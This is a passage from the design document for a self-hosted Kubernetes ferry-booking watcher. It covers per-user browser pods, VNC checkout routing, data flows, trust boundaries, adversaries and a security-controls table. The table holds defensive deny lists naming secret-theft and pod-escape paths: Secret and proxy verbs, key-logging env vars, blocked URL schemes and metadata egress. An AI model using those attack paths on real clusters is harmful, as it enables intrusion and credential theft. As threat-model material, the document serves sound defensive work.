| Postgres | shared `postgres17` (CNPG) | the two control processes and the two Jobs | n/a | n/a | all durable state (§6.4) |

Each control process is a singleton. `strategy: Recreate` plus a `pg_try_advisory_lock` held on a dedicated
connection means a mistaken `replicas: 2` makes the second copy idle.

Why two processes, not three: the draft split the hub (pod-facing) from fleet (pod-creating). The review
merged them because the split only bought defence in depth between two components that face the same,
non-internet input, at the cost of four DB-mediated protocols between them (liveness freeze, kill flag,
`hold_ready_at` relay, breaker freeze), each needing chaos tests. The owner described exactly this shape:
"the operator will have access to spin up browsers … and communicate to the operator". The guarantee that
changes is stated in C3 and §4.5.

### 3.2 Diagram

```
                  Internet (Cloudflare edge + tunnel; CA/US/CN only; TLS ends at Cloudflare and again at Envoy)
                                  |
                   envoy-external (Envoy Gateway 1.9.2)
          +-----------------------+---------------------------------------+
  ferry.chestr.dev (static HTTPRoute, no gateway auth)   ferry-checkout.chestr.dev (static HTTPRoute, no gateway auth)
  RequestHeaderModifier removes Cookie, Remote-*;        RequestHeaderModifier removes Cookie, Authorization
  Authorization kept (the app's own bearer token)
  auth.chestr.dev (Authelia, OIDC issuer) is on the same gateway
          |                                                            |
 +- ns ferry-watch (components/common, components/cnpg) ------------------------------------+
 |        v                                                            v                    |
 |  ferry-web :8765  ---- no k8s RBAC ----                     vnc-edge :8080 (nginx)       |
 |   OIDC RP + bearer sessions | per-user API + WS | admin     stock KasmVNC client + shim  |
 |   ticket minter (Ed25519) | outbox -> Web Push, email        proxies WS upgrades only     |
 |   egress: token endpoint + JWKS via envoy-external pods            |                     |
 |        |  SQL (role ferrywatch_web)                                |                     |
 |        v                                                           |                     |
 |  Postgres ferrywatch on postgres17 (database ns)  LISTEN/NOTIFY    |                     |
 |        ^  SQL (role ferrywatch_control)                            |                     |
 |  ferry-control :8766  ("the operator")                             |                     |
 |   hub endpoint: TokenReview | protocol | budget | brake            |                     |
 |   fleet loop:   lightkube -> kube-apiserver: pods only             |                     |
 +--------^-----------------------|-----------------------------------|---------------------+
          | WS dialled BY the agent| create/delete (VAP-pinned)        | WS :6080
          | projected token, aud ferry-watch-agent                     |
 +- ns ferry-watch-browsers (chart-made, PSA restricted, default deny, no Secrets) ---------+
 |  Pod fw-<trip>-g<gen>  (warm or short check; one per trip; restartPolicy Never; 26 h)     |
 |   tini -- ferry-watch-agent (supervisor)                                                  |
 |     |- Watcher(1 trip) + SiteSession + hub client + local budget bucket                   |
 |     |- VNC gate :6080 (ticket, owner, cart, Origin, first-viewer lock) == unix socket ==> |
 |     |- Xvnc (RFB on /tmp/kasm/rfb.sock only, mode 0600; no TCP), matchbox,                |
 |     |  Chromium (kiosk, managed policies)                                                 |
 |     `- probes :8080 (/livez, /readyz)                                                     |
 |  Service browsers (headless), params ConfigMap, quotas, LimitRange                        |
 +-------------------------------+-----------------------------------------------------------+
                                 | egress: kube-dns (L7 DNS allowlist), ferry-control:8766,
                                 | toFQDNs bcferries.com / *.bcferries.com / *.queue-it.net :443;
                                 v while a cart is held (label egress=hold): any public address :443
                      BC Ferries, Queue-it, payment/3DS  <-- one home WAN IP for everything
```

### 3.3 How each user reaches their own pod

Five facts make per-user routing work, including when several people check out at once:

1. **One host.** Every checkout uses `https://ferry-checkout.chestr.dev`. There is one static HTTPRoute, created by
   the chart, never by the app.
2. **One path per pod.** Each pod is named `fw-<trip>-g<gen>` (16-hex trip id, generation number). Its
   checkout lives under `/t/<trip>/g/<gen>/`, and its WebSocket at `/t/<trip>/g/<gen>/ws`.
3. **One DNS name per pod.** Each pod sets `hostname: fw-<trip>-g<gen>` and `subdomain: browsers`, so the
   headless Service gives it `fw-<trip>-g<gen>.browsers.ferry-watch-browsers.svc.cluster.local`. vnc-edge's
   nginx turns the path into that name with a regex and proxies the upgrade there (§7.9). No table, no
   lookup, no app code.
4. **One ticket per owner, trip, pod and cart.** ferry-web mints a ticket only for the signed-in owner of a
   trip whose pod holds a cart. The pod checks that the ticket's `sub` equals its own `FW_OWNER`, its `trip`
   and `pod` equal its own, and its `cart_id` equals the cart it holds (§5.5). Then it locks to that device.
5. **Independence.** Alice's checkout is `/t/aaaa…/g/3/ws` → Alice's pod; Bob's is `/t/bbbb…/g/7/ws` → Bob's
   pod. Guessing Bob's path reaches Bob's pod, which refuses anything but Bob's ticket, and then only Bob's
   first device.

### 3.4 Trust boundaries

| TB | Boundary | Mechanism |
|---|---|---|
| TB1 | Internet → ferry-web | No gateway auth; the route removes every Cookie header (and the dev header adapter's `Remote-*` names). The app verifies sign-in itself (OIDC code + PKCE, signed `id_token`) and then requires its own opaque bearer session on every API call and as the dashboard WebSocket's first message (C29). The existing Origin and JSON checks on mutations (`server.py:220-229`). Unauthenticated requests reach only the static shell, `/auth/*` and 401s (R19). |
| TB2 | Internet → vnc-edge → pod | Static routing. nginx forwards only upgrades matching the path regex. The in-pod gate verifies the ticket and the first-viewer lock. Origin is pinned. Cookie and Authorization are removed. |
| TB3 | Browser pod → ferry-control | Projected token (audience `ferry-watch-agent`, 600 s) checked by TokenReview and bound to the `browser_pods` row written before the pod was created. A strict schema with size caps. Treated as forgeable for its own trip only. |
| TB4 | ferry-web ↔ ferry-control | Only Postgres rows and NOTIFY, under per-role GRANTs, row-level security (RLS) and triggers. No RPC. |
| TB5 | ferry-control → kube-apiserver | Role scoped to `pods` in one namespace. A VAP pins the pod shape. PSA `restricted`. |
| TB6 | Browser → world | CiliumNetworkPolicy: FQDN plus DNS L7 allowlist outside holds; any public address on TCP 443 while a cart is held (label set only by ferry-control, §7.6); private and cluster destinations never. Chromium policies, kiosk mode, a page watchdog. |
| — | Cluster admin and anything with cluster-admin (the owner; `openclaw`; `home-cluster-runner`), Cloudflare | Out of scope and fully trusted. Tenants are told so on the invite email and the dashboard's About page. |

### 3.5 Data flow (a): adding and enabling a trip

1. The user submits the trip form. `POST /api/trips` carries the app session token (`Authorization:
   Bearer`), which ferry-web resolves to an active user, then passes the same-origin and JSON checks
   (`server.py:220-229`). ferry-web validates with `Trip.from_json` (`models.py:204-258`).
2. Inside one transaction ferry-web:
   - runs `SELECT … FROM users WHERE id=$me FOR UPDATE`;
   - counts the user's trips that are neither past nor archived, against `maxTrips`;
   - checks the date against the 30-day horizon (`PollPolicy.within_horizon`, `polling.py:84-86`);
   - `INSERT trips(id = 16 random hex, user_id = $me, rev = 1, spec)`, an event row and an audit row;
   - runs `NOTIFY fleet_wake`.

   A limit returns 409 `{field, limit, usage}` (`maxTrips` or the horizon only). Enabling a trip never asks
   the user to pause another: which trip gets the warm browser is automatic (owner, round 3).
3. The fleet loop wakes and recomputes the desired state (§6.6):
   - the user's **warm trip** is the enabled trip with the nearest first departure within 7 days
     (`warm_trip`, `polling.py:98-105`; the N nearest if an admin raised `maxActiveBrowsers` to N). If the new
     trip is nearer than the current warm trip, the warm browser moves to it once the current pod is not
     holding a cart (the old pod drains; the new one starts);
   - every other enabled trip is in **short checks** (badge "Checked every 6 h · next 2:05 pm"); a new or
     re-enabled trip's first short check is due at once, so the user sees sailings within minutes;
   - the cluster cap and the start throttle apply to both; a warm trip that doesn't fit is
     `Queued(position)` ("Waiting for a free browser (#2)"), and a due short check waits for the spare slot
     (§6.6);
   - if admitted, the loop runs `INSERT browser_pods(name='fw-<trip>-g<n>', mode, …)`, creates the Pod
     (checked by the VAP), records the returned uid, and sets the phase to `Starting`.
4. In the pod, tini starts the agent supervisor, which:
   - starts Xvnc on a unix socket only, then matchbox;
   - launches Chromium in kiosk mode under policy;
   - runs the fail-closed self-tests (§5.6);
   - dials `ferry-control` with its projected token.
5. ferry-control runs TokenReview and binds the socket to `(owner, trip, gen)` from `browser_pods`. It sends
   `configure` with the spec, the `mode` (`warm` or `short_check`), the interval from the poll curve (§9.3),
   cart and hold policy, `alerted[]`/`offered[]` from `alert_memory`, and `vnc_allowed`.
6. The agent walks the booking form, possibly through Queue-it, and sends `state{phase: watching, sailings}`.
   ferry-control upserts `trip_state` and runs `NOTIFY trip_changed`. ferry-web pushes a new per-user
   snapshot to that user's dashboard sockets. A warm pod then checks on the curve; a short-check pod sends
   `bye{short_check_done}` and exits after this one check unless it found an opening and carted it (§3.6).
7. If no first check arrives within 15 min (`CHECK_TIMEOUT_SECONDS`, `watcher.py:48`), the fleet loop marks
   the pod Failed and recycles it with back-off.

### 3.6 Data flow (b): a sailing opens, through to recycle

Numbers below are the defaults from the canonical table in §8.2.

1. **Opening.** A check finds a new departure in the trip's window (`watcher.py:441`), in a warm pod or in a
   short-check pod. The agent carts it only if all hold: `configure.auto_cart` (daily holds and attempts left,
   VNC minutes left ≥ session length, outside the user's own quiet hours, `user_settings`), the
   compiled per-pod limits, and **a cart claim that ferry-control grants** (`cart_claim`, §5.3): ferry-control
   grants it only if the user holds no cart and has no live claim (one hold per user at a time, owner round
   3), in one SQL statement, so a warm pod and a short-check pod of the same user can never both cart. A
   granted claim also proves ferry-control is reachable, so nobody is carted while alerts can't be
   delivered. Otherwise the agent records the departure as *offered* and sends a `bookable` alert, whose
   words say why (ferry-control's `held_back`: quiet hours, auto-cart off, holding elsewhere, a limit); an
   offered departure may still be carted later if it is still open when the limit clears (§5.2). A departure
   whose cart failed isn't tried again on its own (each try spends a daily cart attempt): only after the user
   asks (Check now, "Hold it for me") or once it sells out and reopens. "Hold it for me"
   (`POST /api/trips/{id}/hold`) lifts quiet hours, and the trip's own auto-cart off, for that trip for
   10 minutes (`trip_runtime.hold_requested_until`), and checks now; every other limit and the claim still
   apply, and ferry-control clears the request once a cart is held or fails. Quiet hours are each user's own
   (0.6.3; none unless they set some): in them the user's trips aren't checked at all (no pods start, pods not
   holding a cart are drained, any pod left is told `active=false`), so nothing opens, is held or alerts. A
   manual check lifts them for that trip for 10 minutes too (`trip_runtime.quiet_lifted_until`), and while
   lifted the trip is checked and may cart as usual. When carting, the agent:
   - runs `add_to_cart` (≤40 s, `CART_BUDGET_SECONDS`, `watcher.py:50`);
   - on READY, starts its local hard-cap clock;
   - sends `alert{cart_held, depart, fare, price}` and `state`, buffered until acked.

   A short-check pod that carts stays for checkout and follows the same hold flow; it never goes back to
   watching.
2. **Persist, open egress, alert.** ferry-control validates the message and upserts `trip_state.cart`. If
   `hold_ready_at` is unset for this `cart_id`, it sets it from its own clock and patches the pod's label
   `ferry-watch.io/egress` to `hold`, which opens public HTTPS egress for this pod only (§7.6). In one
   transaction it inserts `notifications(kind=cart_held, dedup_key=trip:cart_id:cart_held)` and increments
   `usage_ledger`, then acks. The agent starts its unclaimed-hold clock at the ack. While unclaimed, the
   agent checks every few minutes that the cart is still alive on the site, by reading the cart page without
   pressing the site's "continue" control. Whether a reload extends BC Ferries' own timer is not known (no spike, owner round 2):
   the agent records the site's timer when it shows one, our own unclaimed clock caps the hold either way,
   and the check can be turned off by a values flag. A cart the site has already dropped sends
   `cart_expired{by_site}` at once (its age feeds the site-TTL histogram) and never counts as viewed.
3. **Deliver.** ferry-web's outbox worker gets the NOTIFY and renders the typed kind from its own templates
   (§6.7): "Held for you: 7:00 am Tsawwassen → Swartz Bay, Fri Aug 1. Check out as a guest by 3:42 pm …".
   The link is built from its own template: `https://ferry.chestr.dev/c/<trip>`. It sends Web Push (urgency
   high, TTL 1800 s) and email.
4. **Choose a device.** The user taps the notification. The service worker builds the URL from the trip id
   against a constant origin. If the app session has lapsed, the SPA redirects to Authelia's authorization
   endpoint, which sends the browser straight back while the Authelia session is alive, and returns to
   `/c/<trip>` (§6.2.4). `/c/<trip>` shows the sailing, the deadline, and three choices, with the copy
   "Checkout will be locked to the device you choose" and "Check out as a guest. Don't sign in to BC Ferries
   here: it doesn't accept a sign-in while a cart is held" (§5.7):
   - **Check out on this device** POSTs `/api/trips/<trip>/vnc`. ferry-web checks that the user owns the
     trip, that `trip_state` shows a READY cart with this `cart_id` in the current pod, and that the user
     has made fewer than 10 mints this minute. It mints a ticket (§5.5), writes `vnc_mints` and audit rows,
     and returns `https://ferry-checkout.chestr.dev/t/<trip>/g/<gen>/#t=<ticket>`. The page navigates there.
   - **I'll use my computer** emails the user a fresh `/c/<trip>` link (no ticket) and shows "Open Ferry
     Watch on your computer".
   - **Release and book it myself** releases the cart (warning that the space returns to the public pool),
     then opens `search_url` on bcferries.com.
5. **Connect.** vnc-edge serves the landing page; the ticket stays in the URL fragment, which no server sees.
   - The landing page reuses the device's resume nonce `N` for this `(trip, gen)` from localStorage, or
     generates a 256-bit one; it keeps the ticket in sessionStorage, clears the fragment, and loads the stock
     KasmVNC client at `/vnc.html#path=t/<trip>/g/<gen>/ws&autoconnect=1&reconnect=1&…`.
   - The shim (loaded before the client) adds the subprotocols `["binary", "fw.t1.<ticket>", "fw.n1.<N>"]`
     to that one WebSocket. nginx proxies the upgrade to
     `fw-<trip>-g<gen>.browsers.ferry-watch-browsers.svc.cluster.local:6080`.
   - The gate checks the ticket, sets the first-viewer lock to `sha256(N)` in the same synchronous step,
     and bridges the WebSocket to Xvnc's unix socket.
   - The agent reports `viewer{connected}`, and the checkout-session clock starts.
6. **Checkout.** The user pays on the real bcferries.com page; the payment page and the bank's 3DS page load
   from whatever public HTTPS host they use, because the pod's egress is open while the cart is held.
   - The gate pings every 20 s, which also keeps Cloudflare's idle timer alive. A missed pong drops the
     viewer and starts the viewer-gone clock (10 min).
   - When the phone sleeps or the user switches to their bank app, the client reconnects with only
     `fw.n1.<N>`; a reconnect with the locked `N` replaces any stale socket.
   - While any frame is on a host other than bcferries.com or Queue-it (a payment or bank page), or the
     payment step has been submitted, the session and viewer-gone clocks pause; only the hard cap runs.
   - If a frame still fails to load (the hold-egress label didn't apply, R16), the agent sends
     `event{checkout_host_blocked}` (no hostname); ferry-control re-applies the label and alerts the admin,
     and the user sees "Your bank's page didn't load; try again, or use Release and book it myself".
7. **End.** The hold ends on whichever comes first: BC Ferries' confirmation page appearing (a booking);
   the user's "Done" or "Release" in the dashboard
   (web → `agent_commands` → control → `command{release}`); checkout-session expiry or viewer-gone; the hard
   cap (60 min from READY); the window closing. The agent closes the socket and empties the cart, then
   checks the release (§5.2: the landing URL now, the empty cart once the M1 fixtures exist), **except** when
   payment is in progress: then it closes the socket without navigating and leaves BC Ferries' own timer to
   clear the cart. It sends `bye{viewer_was_connected, outcome, release_check}` and exits 0. `outcome` is
   `booked` when the agent saw BC Ferries' confirmation step (selector from the confirmation page captured
   during the owner's M1 use; until then the user's "Did you book it?" answer records it; no booking
   reference crosses the protocol). Any visit to the login page or an account-required page during the
   checkout was reported as `event{checkout_login_seen, forced}`, where `forced` says the site sent the
   checkout there rather than the user choosing to go (§5.7).
8. **Recycle.** The fleet loop records the pod Succeeded and deletes it, and releases the user's cart claim.
   - `outcome = booked`: ferry-control archives the trip and inserts a "Booked!" notification (with the Ko-fi
     link on the screen it opens).
   - A hold released on request (`bye{hold_ended, released}`: the user's Release, an admin's, or the trip's
     search edited mid-hold) asks nothing: the outcome is recorded and a new pod watches the trip on (0.6.3).
   - A hold drained because the user removed the trip asks nothing either: the outcome is recorded (0.6.4).
   - Otherwise ferry-control sets `paused_reason='after_checkout'` and inserts a `booked_it` notification
     ("Did you book it?"). **The trip stays paused until the user answers** (owner, round 3: no automatic
     resume). "Yes" archives the trip; "No, cancel" archives it too (answer `cancelled`); "No, keep watching"
     (with an optional one-tap reason: "the site wanted me to sign in", "I tried to sign in", "payment
     failed", "checkout broke", "ran out of time", "changed my mind") clears the pause, and the trip goes
     back into warm-trip selection and short checks with a new pod
     `fw-<trip>-g<n+1>` when it next needs one. The question stays on the trip card until answered; the push
     and email are sent once. Answers and reasons feed `ferrywatch_holds_total{outcome}`, the hold-outcome
     record and the guest-checkout alert (§5.7). While the trip is paused, the user's warm browser goes to
     their next-nearest trip, if any.
   - The viewed departure stays in `alerted`, so it is never re-carted (C22).
9. **Unviewed expiry.** If no viewer ever connected, the cart is emptied and the release checked (§5.2)
   after 30 min (reminder at 15). The user gets `cart_expired`, with "Still bookable: book on bcferries.com"
   when the last check saw it open. ferry-control patches the egress label back to `allowlist` (and deletes
   the pod if that fails within 60 s) and releases the claim. A warm pod then **resumes watching in place**,
   which saves a Queue-it pass; a short-check pod exits.

### 3.7 Who is authoritative for what

| Fact | Authority | Mirror / consumer |
|---|---|---|
| Trip spec, rev, enabled, paused reason | Postgres `trips` (ferry-web; ferry-control may set `paused_reason` and archive only) | agent via `configure` |
| Whether a pod should exist; which trip is warm; when a short check is due; queue position | ferry-control fleet loop (`trip_runtime`, `browser_pods`; `warm_trip` in `polling.py`) | dashboard |
| Cart state, hold timers, viewer, VNC gate | the agent | `trip_state` (ferry-control) |
| One hold per user (cart claim) | ferry-control (`hold_claims`) | agent: no cart without a granted claim |
| Hold backstop clock; the pod's hold-egress label | ferry-control writes `hold_ready_at` with its own clock and enforces it; it sets and clears `ferry-watch.io/egress` | Cilium enforces the label (§7.6) |
| Interval and brake | ferry-control (the poll curve from `polling.py`, stretched by the budget; brake persisted in `fleet_state`) | agent local bucket |
| Alert memory (`alerted`, `offered`) | the agent decides; ferry-control persists it in `alert_memory` | `configure` on reconnect |
| Who may see the VNC view | **the pod**: ticket, `FW_OWNER`, cart, lock | ferry-web only decides whether to mint |
| Who the user is | the IdP's signed `id_token` at sign-in and at each 24-hourly re-verification (`iss`, `sub`), verified by ferry-web; in between, ferry-web's own session row | ferry-web computes the uid from `(iss, sub)` and the GitOps aliases (§6.2.6) |

---

## 4. Security model

### 4.1 Assets, highest value first

1. The card number, CVV, 3DS codes and guest contact details typed over VNC during checkout
   [R:billing-guest-mode-credentials Q3].
2. A live cart and session. In the deferred login mode this would include account cookies.
3. The reputation of the shared home egress IP with BC Ferries and Queue-it, which the owner's household also
   uses.
4. The owner's cluster, home LAN, the shared Postgres (Authelia, lldap, Immich…), the 1Password vault, and
   the owner's Authelia session (valid across `*.chestr.dev`).
5. The integrity of alerts, because they are a phishing channel.
6. Tenants' itineraries, which are personal data because they show when someone is away.

### 4.2 Adversaries

- **A1** controls ferry-web or vnc-edge (both internet-facing).
- **A2** is a malicious invited tenant, using the API, VNC during their own holds, and their own pod's browser.
- **A3** has code execution in one browser pod: a malicious page or third-party script, a Chromium exploit
  (`--no-sandbox` unless the optional sandbox hardening is applied, R2), or A2 working through VNC.
- **A4** controls ferry-control through its only input, the agent protocol (that is, A3 escalating).

Out of scope: the cluster admin, node root, GitOps, backups, the registry signer, `openclaw` and
`home-cluster-runner` (cluster-admin), Cloudflare, and BC Ferries' own page supply chain.

### 4.3 Who can see each secret

"Yes" means the component handles the value in plaintext during normal operation. The cluster admin can see
everything (R1).

| Value | Browser pod | ferry-control (operator) | ferry-web | vnc-edge | Envoy | Cloudflare edge + cloudflared | Postgres | Logs (VictoriaLogs) |
|---|---|---|---|---|---|---|---|---|
| Card number, CVV, 3DS codes, guest contact details (typed over VNC); a BC Ferries password, if a user signs in during checkout despite the advice (§5.7) | yes (own tenant only) | **no** | **no** | yes (RFB is plaintext) | yes | yes | no | no |
| BC Ferries guest cart cookie | yes (own) | no | no | no | no | no | no | no |
| VNC ticket (60 s, single use) | verifies it | no | mints it | yes (subprotocol header) | yes (header, not logged) | yes | `jti` only | no |
| Resume nonce `N` | stores `sha256(N)` | no | **no** | yes | yes | yes | no | no |
| Authelia session cookie | no | no | no (removed at the route) | no (removed) | yes | yes | no (in Dragonfly) | no |
| OIDC authorization code (URL fragment, then a JSON body) | no | no | yes (exchanges it once) | no | yes (body, not logged) | yes | no | no |
| `id_token` (ferry-web ↔ issuer, in-cluster through envoy-external) | no | no | yes (verifies, keeps `iss`, `sub`, claims) | no | yes | no | `iss`, `sub` and claims only | no |
| App session token (bearer) | no | no | verifies it; stores only its SHA-256 | no | yes (`Authorization`, not logged) | yes | hash only | no |
| Itineraries, emails | own trip only | yes | yes | no | yes | yes | yes | no |
| Ticket signing key, VAPID key, OIDC client secret | ticket public key only | no | yes | no | no | no | no | no |

Two rows matter most. The operator sees no card data and no checkout screen, which is the owner's
requirement. Cloudflare, cloudflared, Envoy and vnc-edge do see checkout keystrokes, because RFB is plaintext
once TLS ends; tenants are told (R4).

### 4.4 Controls

"From" is the milestone where the control first ships (§12.2).

| # | Control | Threat it stops | Where enforced | From |
|---|---|---|---|---|
| C1 | Guest mode only. No API accepts BC Ferries credentials. The VAP forbids secret volumes, `envFrom` and `valueFrom`. The login code stays in the agent behind a flag v1 images never set (§5.7). | A *stored* BC Ferries password or account cookie leaking from any component. (A password a user types into bcferries.com during checkout is exposed like card data, R4 and R2; the copy advises against it, §5.7.) | agent build (`credentials=None`), API, VAP `fw-browser-pod` | M1 |
| C2 | ferry-web has no Kubernetes token and no RBAC | A1 shaping pods, reading Secrets, exec | chart: `automountServiceAccountToken: false`; helm-unittest | M1 |
| C3 | Only ferry-control may create pods in the browser namespace; it has no internet ingress and its only input is the strict agent protocol from browser pods | Internet-reachable code holding `pods/create`. **Changed from the draft:** a parser exploit by A3/A4 now reaches `pods/create` too (still VAP-pinned; see §4.5). | VAP `fw-browser-pod` (creator check); NetworkPolicy; RBAC | M1 |
| C4 | Exact pod template: digest-pinned image, a fixed env list with literal values, fixed volumes, no command/args/hooks/exec probes/extra containers/hostAliases/dnsConfig/nodeName/runtimeClass/Multus annotation/ownerReferences | "create pods = read Secrets"; `DEBUG=pw:*`, `SSLKEYLOGFILE`, `NODE_OPTIONS`, base-URL redirection, sidecars | VAP `fw-browser-pod` with GitOps params; PSA `restricted` | M1 |
| C5 | Pods are immutable except one label: ferry-control may change only `ferry-watch.io/egress` between `allowlist` and `hold` (round 3); no other UPDATE or patch, and no ephemeral containers, exec, attach or port-forward, by any app identity | Image swap, env or deadline changes, or interactive access to a live pod | RBAC (only ferry-control has `pods` patch) + VAP `fw-browser-pod-lock` with its one-label exception (M1, because the patch verb needs it) + CI `can-i` | M1 |
| C6 | No app identity holds `pods/proxy`, `services/proxy`, `nodes/proxy`, `pods/log`, any Secret verb, any workload-controller create, or `external-secrets.io/*` | API-server proxy paths that arrive SNATed as `kube-apiserver`; reading the 1Password vault through ESO | RBAC; helm-unittest forbidden list; `can-i` negatives in CI (M1); VAP `fw-ns-objects` as a second fence (M2) | M1/M2 |
| C7 | The agent dials out with a typed protocol that has no navigate, URL, JS, screenshot, cookie, storage, base_url or log-level operation | The operator extracting page content or steering the browser | `ferry_watch_core.protocol` (strict msgspec, unknown fields rejected); a CI test walks the schema | M1 |
| C8 | Projected token (audience `ferry-watch-agent`, 600 s), TokenReview, binding to the `browser_pods` row the fleet loop wrote before creating the pod; every message's trip must match | A pod impersonating another pod or trip; a token replayed against the API server | ferry-control | M1 |
| C9 | Agent output is forgeable for its own trip only: schema caps, typed alert kinds, no free text into alerts, links only from web templates | A3 phishing through alerts or poisoning other tenants | ferry-control (validation) + ferry-web (rendering) | M1 |
| C10 | VNC ticket: Ed25519, 60 s, single-use `jti`, bound to `sub == FW_OWNER`, trip, pod and `cart_id`; public key pinned by the VAP; `aud` names the purpose and v1's gate accepts only `fw-vnc` (checkout, which requires a held cart) | Cross-tenant VNC, ticket replay, a stale cart | in-pod gate | M1 |
| C11 | First-viewer lock: after the first accept, only the holder of nonce `N` can connect; tickets are ignored for that cart; the check-and-set is one synchronous step | A compromised **ferry-web** taking over a session after the user connected. It does **not** constrain a compromised vnc-edge, Envoy or Cloudflare, which see `N` (R4). | in-pod gate | M1 |
| C12 | Single viewer: one socket at the gate (a reconnect with `N` replaces it) and Xvnc `-NeverShared -DisconnectClients=0` | Silent co-viewing | gate + Xvnc | M1 |
| C13 | Xvnc serves RFB only on a unix socket (`-rfbunixpath`, mode 0600) with no TCP or WebSocket listener and no `-httpd` | Page JS opening a loopback socket and reading the framebuffer past the payment iframe's isolation. Browsers have no AF_UNIX API. (A3, as uid 1001, can open the socket; it already owns that session.) | agent supervisor; self-test asserts no extra listeners | M1 |
| C14 | Pods never serve HTML. vnc-edge serves the stock client with a build-computed CSP (`connect-src 'self' wss://ferry-checkout.chestr.dev`, hashed inline script, `frame-ancestors 'none'`, `base-uri 'none'`, `form-action 'none'`), `Referrer-Policy: no-referrer` and `no-store`. nginx proxies only WS upgrades. vnc-edge stays a stock, logic-free nginx plus static files. | Tenant-compromisable script on a chestr.dev origin; a page pointing the client at a keystroke relay | vnc-edge image and config | M1 |
| C15 | Ticket only in the URL fragment, resume nonce only in `Sec-WebSocket-Protocol`, the OIDC code only in the URL fragment (`response_mode=fragment`) and then a JSON body, the app session token only in `Authorization` and the dashboard WebSocket's first message; none appears in a path or query that Envoy, nginx or VictoriaLogs records | Tickets, nonces, codes and session tokens leaking into access logs, which VictoriaLogs and `openclaw` can read | landing page + shim + gate; SPA + ferry-web | M1 |
| C16 | Every Cookie header removed on both routes. Authorization removed on the VNC route; kept on the dashboard route, where it carries only the app's own bearer token. The dashboard route also removes `Remote-User`, `Remote-Groups`, `Remote-Email` and `Remote-Name` (defence in depth for the dev header adapter). ferry-web sets no cookie. | A pod or a compromised ferry-web replaying the owner's Authelia session from the server into Immich, Windmill or internal apps. (Script served from the ferry host can still make same-site requests that carry the cookie; R12.) | HTTPRoute RequestHeaderModifier; post-deploy echo test; a CI test that ferry-web never sends `Set-Cookie` | M1 |
| C17 | "Cart held" enforced five times: agent (authoritative); web won't mint; ferry-control deletes at `hold_ready_at + hard cap + 5 min` by its own clock; Xvnc `-MaxConnectionTime 6000`; `activeDeadlineSeconds 93600` | VNC kept open outside a hold, by a buggy or lying agent | agent, web, control, Xvnc, kubelet | M1 |
| C18 | Compiled agent maxima: interval ≥ 30 s (the same floor as `polling.py:21`), unclaimed ≤ 45 min, session ≤ 45 min, hard ≤ 90 min, viewer-gone ≤ 15 min, ≤ 6 cart attempts per pod, no cart without a granted claim; a short-check pod checks once; no "0 = forever" | A compromised control plane making holds endless or polling unbounded (not A3, see R13) | agent code (not configurable) | M1 |
| C19 | Gate revocation: the socket closes on release, expiry, session cap, viewer-gone, `vnc_revoke`, drain or suspend; a viewed hold always ends with the pod exiting | Gateways check only the upgrade [R:map-k8s-research §e] | agent gate; pod delete as the final kill | M1 |
| C20 | Egress: outside holds, Cilium `toFQDNs` on TCP 443 to bcferries.com and Queue-it plus a DNS L7 rule that resolves only those names (and the control FQDN); while a cart is held (`ferry-watch.io/egress: hold`, set and cleared only by ferry-control), additionally any public IPv4 address on TCP 443 and DNS for any name (owner, round 3). Always denied: private, CGNAT, link-local (metadata) and loopback ranges, LAN, nodes, kube-apiserver, other pods, smtp-relay and observability | Outside holds: the browser used as a proxy, DNS exfiltration, unauthorised sites. Always: lateral movement into the cluster or LAN | Two CiliumNetworkPolicies (GitOps values); the label flip (§6.6); C5 | M1 |
| C21 | Chromium lockdown: `--kiosk`, managed policies in all 3 directories (only `https://` and `about:blank`; no `file://`, `chrome://`, `view-source:`, loopback names, downloads or extensions), watchdog, minimal env; self-test requires `ERR_BLOCKED_BY_ADMINISTRATOR` for those | Escaping to local files, browser internals, downloads, extensions. (Other sites are stopped by C20 outside holds, not by Chromium.) | browser image + agent | M1 |
| C22 | A pod that had a *checkout* viewer never watches again (exit, fresh pod). A departure viewed in checkout is never re-carted by the agent on its own. (A viewer in a future sign-in window, and a re-cart the user explicitly asks for, are named branches that stay disabled in v1, §5.7.) | Anything a viewer did persisting into the next session; double bookings | agent (`watcher.py:510-542` changes) + fleet loop | M1 |
| C23 | Deterministic user id: at every sign-in `uid = identityAliases.get(h, h)` with `h = hash(iss, sub)`, computed only from the verified `id_token` and the GitOps ConfigMap; the `identities` row is a cache that must equal it (a mismatch refuses the sign-in and alerts the admin); `trips.user_id` immutable by trigger; `FW_OWNER` set at pod create and checked by the VAP against the owner label | A DB row re-owning a live or future browser | Postgres trigger + VAP + gate | M1 |
| C24 | Per-process DB roles (`ferrywatch_web`, `ferrywatch_control`); `audit_log` INSERT-only for both; RLS lets web insert only `test`, `account`, `admin` and `invited` notifications | A1 rewriting audit, writing pod bindings or trip state, or making forged agent-kind rows appear agent-originated in the outbox (attribution; a compromised web can still message tenants directly, §4.5) | db-migrate grants + RLS | M1 |
| C25 | Browser namespace without `components/common`; quota `secrets: 0` | Mountable registry/GitHub/Cloudflare secrets | chart; ResourceQuota | M1 |
| C26 | Logs: browser namespace excluded from Fluent Bit; both ferry namespaces denied egress to observability; debug screenshots stay in tmpfs and none are taken while holding | Checkout screens or tokens reaching VictoriaLogs (unauthenticated) or `openclaw` | home-cluster Fluent Bit + NetworkPolicy + agent | M1 |
| C27 | Quotas the app can't edit: a PriorityClass-scoped ResourceQuota, `NotTerminating pods: 0`, LimitRange, PriorityClass `preemptionPolicy: Never` | A runaway or compromised operator exhausting the cluster | GitOps objects; no app verbs on them | M1 |
| C28 | *Withdrawn.* The draft's anchor ConfigMap guard; the anchor no longer exists (§7.8). | — | — | — |
| C29 | **Rewritten in round 2.** The app verifies identity itself and trusts no identity header: Authorization Code + PKCE S256 with a confidential client; the `id_token`'s signature (issuer JWKS, `alg` from an allowlist, `RS256` by default; `none` and HMAC never), `iss`, `aud`/`azp`, `exp`/`iat` and `nonce` checked; an opaque 256-bit session token of which only the SHA-256 is stored, with idle and absolute expiry, re-verification with the IdP at least every 24 h, and server-side revocation on logout and suspension; the dashboard WebSocket authenticates with its first message within 5 s and is closed when its own session is revoked or expires. `TrustedHeaderProvider` is off in production, and the chart refuses to render it enabled together with the external dashboard route. | A forged or replayed identity; a session outliving logout, suspension or removal at the IdP (by more than 24 h); a gateway misconfiguration admitting anyone (there is no gateway policy to detach, so a mistake fails closed) | ferry-web; chart template guard + helm-unittest; unit tests against a fake issuer | M1 |
| C30 | The termination message (`/dev/termination-log`, readable by the operator through `pods get`) carries only a fixed enum reason and error class | A pod-to-operator channel for tenant data | agent + image test | M1 |
